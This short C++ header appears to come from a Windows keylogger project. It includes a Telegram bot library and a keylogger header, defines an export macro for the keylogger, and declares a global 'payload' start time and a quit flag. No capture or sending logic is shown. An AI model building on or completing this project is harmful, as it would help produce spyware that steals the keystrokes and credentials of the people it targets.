#pragma once
#define KEYLOGGER_EXPORTS
#include <TGBot.hpp>
#include <keylogger.hpp>
#include <thread>
#include <chrono>
#include <string>
#include <Windows.h>

//global start time of payload
inline std::chrono::steady_clock::time_point startTime;

inline bool shouldQuit = false;